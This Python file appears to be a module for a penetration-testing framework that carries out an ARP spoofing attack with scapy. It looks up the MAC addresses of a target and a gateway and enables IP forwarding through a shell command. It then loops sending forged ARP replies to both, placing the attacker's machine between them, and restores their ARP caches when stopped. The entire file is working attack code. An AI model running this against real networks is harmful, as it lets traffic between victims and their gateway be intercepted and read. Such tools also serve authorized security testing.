from termcolor import colored, cprint
from module import Module

from scapy.all import *
import threading
from printib import * 
from subprocess import Popen, PIPE

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "ARP Spoofing",
                       "Description": "ARP Spoofing module attack",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"interface": ["eth0", "Interface for sniffing", True],
                   "target": [None, "IP Target or IP address 1", True],
                   "gateway": [None, "IP Gateway or IP address 2", True],
                   "forward": ["True", "IPv4 Forward enabled", True],
                   "verbose": ["False", "Verbose", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        def go(options):

            def enable_forward(options):
                if options["forward"][0] == "True":
                    try:
                        command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
                        data = Popen(command, shell=True, stdout=PIPE).stdout.read()
                        print_ok("IPv4 forward enabled")
                        if options["verbose"][0] == "True":
                            for line in data.decode().split("\n"):
                                print_info(line)
                    except Exception as e:
                        raise Exception(str(e))

            def disable_forward(options):
                if options["forward"][0] == "True":
                    try:
                        command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
                        data = Popen(command, shell=True, stdout=PIPE).stdout.read()
                        print_ok("IPv4 forward disabled")
                        if options["verbose"][0] == "True":    
                            for line in data.decode().split("\n"):
                                print_info(line)
                    except Exception as e:
                        raise Exception(str(e))

            #catch MAC addresses target and gateway
            spoof = True
            arp_reply_packet = None
            myhwaddress = get_if_hwaddr(options["interface"][0])
            myipaddress = get_if_addr(options["interface"][0])
            arp_request_packet=Ether(dst=ETHER_BROADCAST)/ARP(hwsrc=myhwaddress,hwdst=ETHER_BROADCAST,pdst=options["target"][0],psrc=myipaddress)
            if options["verbose"][0] == "True":
                arp_reply_packet=srp(arp_request_packet,iface=options["interface"][0],timeout=2,verbose=True)
            else:
                arp_reply_packet=srp(arp_request_packet,iface=options["interface"][0],timeout=2,verbose=False)
            if arp_reply_packet and arp_reply_packet[0]:
                hw_target = arp_reply_packet[0][0][1].hwsrc
            else:
                print_error("No MAC found for: "+options["target"][0])
                spoof = False
            arp_request_packet=Ether(dst=ETHER_BROADCAST)/ARP(hwsrc=myhwaddress,hwdst=ETHER_BROADCAST,pdst=options["gateway"][0],psrc=myipaddress)
            if options["verbose"][0] == "True":    
                arp_reply_packet=srp(arp_request_packet,iface=options["interface"][0],timeout=2,verbose=True)
            else:
                arp_reply_packet=srp(arp_request_packet,iface=options["interface"][0],timeout=2,verbose=False)
            if arp_reply_packet[0]:
                hw_gateway = arp_reply_packet[0][0][1].hwsrc
            else:
                print_error("No MAC found for: "+options["gateway"][0])
                spoof = False

            if spoof:
                enable_forward(options)
            
            #ARP Spoofing bucle
            t = threading.currentThread()
            while getattr(t, "do_run", True) and spoof:    
                spoof_arp_packet = ARP()
                #poison ARP for target
                spoof_arp_packet[ARP].op = 2
                spoof_arp_packet[ARP].hwsrc = myhwaddress
                spoof_arp_packet[ARP].hwdst = hw_target
                spoof_arp_packet[ARP].psrc = options["gateway"][0]
                spoof_arp_packet[ARP].pdst = options["target"][0]
                
                if options["verbose"][0] == "True":
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=True)
                else:
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=False)
                
                #poison ARP for gateway
                spoof_arp_packet[ARP].op = 2
                spoof_arp_packet[ARP].hwsrc = myhwaddress
                spoof_arp_packet[ARP].hwdst = hw_gateway
                spoof_arp_packet[ARP].psrc = options["target"][0]
                spoof_arp_packet[ARP].pdst = options["gateway"][0]
                
                if options["verbose"][0] == "True":
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=True)
                else:
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=False)

                time.sleep(1)

            #if jobs kill to restore MAC to ARP Cache
            print_info("Killing job ARP Spoofing")
            if spoof:
                disable_forward(options)

                spoof_arp_packet[ARP].op = 2
                spoof_arp_packet[ARP].hwsrc = hw_gateway
                spoof_arp_packet[ARP].hwdst = hw_target
                spoof_arp_packet[ARP].psrc = options["gateway"][0]
                spoof_arp_packet[ARP].pdst = options["target"][0]       
                
                if options["verbose"][0] == "True":
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=True)
                else:
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=False)         

                spoof_arp_packet[ARP].op = 2
                spoof_arp_packet[ARP].hwsrc = hw_target
                spoof_arp_packet[ARP].hwdst = hw_gateway
                spoof_arp_packet[ARP].psrc = options["target"][0]
                spoof_arp_packet[ARP].pdst = options["gateway"][0]             
                
                if options["verbose"][0] == "True":
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=True)
                else:
                    send(spoof_arp_packet,iface=options["interface"][0],verbose=False)
 
        e = threading.Event()
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start()        
       
        super(CustomModule, self).run(t=thread1)
